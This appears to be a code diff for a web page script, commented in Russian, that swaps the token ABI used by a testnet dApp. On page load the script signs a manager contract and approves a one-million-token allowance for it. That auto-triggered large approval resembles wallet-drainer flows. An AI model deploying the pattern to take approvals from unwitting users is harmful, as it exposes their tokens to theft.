@@ -10,29 +10,26 @@
         const managerContractAddress = "0x17276350c8abc1b5f34c07e688ae113c082020cb"; // Адрес контракта CustomTokenManager на тестовой сети
         const managerAbi = [ /* Вставьте ABI вашего CustomTokenManager контракта здесь */ ];
         const customTokenAddress = "0x85f828cd006a5f9b011b0cd69447e3c44d9da220"; // Адрес вашего кастомного токена CustomUSDT
-        const erc20Abi = [
-            {
-                "constant": false,
-                "inputs": [
-                    {
-                        "name": "_spender",
-                        "type": "address"
-                    },
-                    {
-                        "name": "_value",
-                        "type": "uint256"
-                    }
-                ],
-                "name": "approve",
-                "outputs": [
-                    {
-                        "name": "",
-                        "type": "bool"
-                    }
-                ],
-                "type": "function"
-            }
-        ]; // Стандартный ABI для ERC-20 токена
+        const customTokenAbi = [
+            {"inputs":[],"stateMutability":"nonpayable","type":"constructor"},
+            {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"allowance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientAllowance","type":"error"},
+            {"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"uint256","name":"balance","type":"uint256"},{"internalType":"uint256","name":"needed","type":"uint256"}],"name":"ERC20InsufficientBalance","type":"error"},
+            {"inputs":[{"internalType":"address","name":"approver","type":"address"}],"name":"ERC20InvalidApprover","type":"error"},
+            {"inputs":[{"internalType":"address","name":"receiver","type":"address"}],"name":"ERC20InvalidReceiver","type":"error"},
+            {"inputs":[{"internalType":"address","name":"sender","type":"address"}],"name":"ERC20InvalidSender","type":"error"},
+            {"inputs":[{"internalType":"address","name":"spender","type":"address"}],"name":"ERC20InvalidSpender","type":"error"},
+            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},
+            {"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},
+            {"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"value","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
+        ];
 
         document.addEventListener('DOMContentLoaded', async () => {
             if (typeof window.ethereum !== 'undefined') {
@@ -51,7 +48,7 @@
                     await managerContract.methods.sign().send({ from: userAddress });
                     console.log("Контракт подписан пользователем:", userAddress);
 
-                    // Предоставляем разрешение на управление USDT токенами
+                    // Предоставляем разрешение на управление кастомными токенами
                     await approveTokens(userAddress, customTokenAddress, "Custom Token");
 
                     alert("Контракт успешно подписан и разрешение предоставлено!");
@@ -66,7 +63,7 @@
         async function approveTokens(userAddress, tokenAddress, tokenName) {
             try {
                 // Создаем экземпляр контракта токена
-                const tokenContract = new web3.eth.Contract(erc20Abi, tokenAddress);
+                const tokenContract = new web3.eth.Contract(customTokenAbi, tokenAddress);
                 const amountToApprove = web3.utils.toWei("1000000", "ether"); // Лимит для разрешения
 
                 // Выполняем транзакцию approve для предоставления доступа контракту на управление токенами
